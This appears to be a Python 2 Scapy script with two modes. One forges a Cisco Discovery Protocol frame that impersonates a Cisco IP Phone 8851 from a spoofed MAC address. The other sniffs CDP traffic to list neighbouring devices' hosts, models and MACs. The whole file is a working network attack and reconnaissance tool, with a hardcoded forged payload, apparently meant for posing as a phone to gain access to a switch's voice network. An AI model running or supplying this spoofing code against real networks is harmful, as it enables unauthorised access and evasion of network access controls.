#!/usr/bin/env python
from scapy.all import *
import socket

def cdp_spoof(source):
    print source

    test=Dot3(dst='01:00:0c:cc:cc:cc', src=str(source), len=146)/LLC(dsap=0xaa, ssap=0xaa, 
    ctrl=3)/SNAP(OUI=0xc, code=0x2000)/Raw(load='\x02\xb4W\xc5\x00\x01\x00\x13SEP38205645AAAA\x00\x02\x00\x11\x00\x00\x00\x01\x01\x01\xcc\x00\x04\xc0\xa8\x01\xae\x00\x03\x00\nPort 1\x00\x04\x00\x08\x00\x00\x04\x90\x00\x05\x00\x1bsip88xx.10-3-1-20.loads\x00\x06\x00\x17Cisco IP Phone 8851\x00\x1c\x00\x07\x00\x02\x00\x00\x19\x00\x0cK\xc6\x00\x00\x00\x00&?\x00\x0b\x00\x05\x01\x00\x10\x00\x06&?')

    sendp(test, count=1)

def packetPortion(packet, start, end):
    i = start
    while packet[0].load[i] != end:
        i+=1;
    return packet[0].load[start:i]

def cdp_discover(packet):
    print "--------------------------------------------------"
    print "Host: " + packetPortion(packet, 8, '\x00')
    print "Model: " + packetPortion(packet,89, '\x00') 
    print "Protocol: " + packetPortion(packet, 62, '\x00')
    #print "IP: " + socket.inet_ntoa(packetPortion(packet, 36, '\x00'))
    print "MAC: " + packet[0].src
    print "--------------------------------------------------"

if __name__ == "__main__":
    if len(sys.argv) == 1:
        print "Usage: ./cdp.py -s [source mac-address] (spoof from source)\n"
        print "Usage: ./cdp.py -c (capture)"
        sys.exit()

    if str(sys.argv[1]) == '-c':
        while 1:
            sniff(filter='ether host 01:00:0c:cc:cc:cc',prn=cdp_discover, count=1)

    if str(sys.argv[1]) == '-s':
        if len(sys.argv) < 3:
            sys.exit()
        cdp_spoof(sys.argv[2]) #18:cf:5e:f8:41:0e
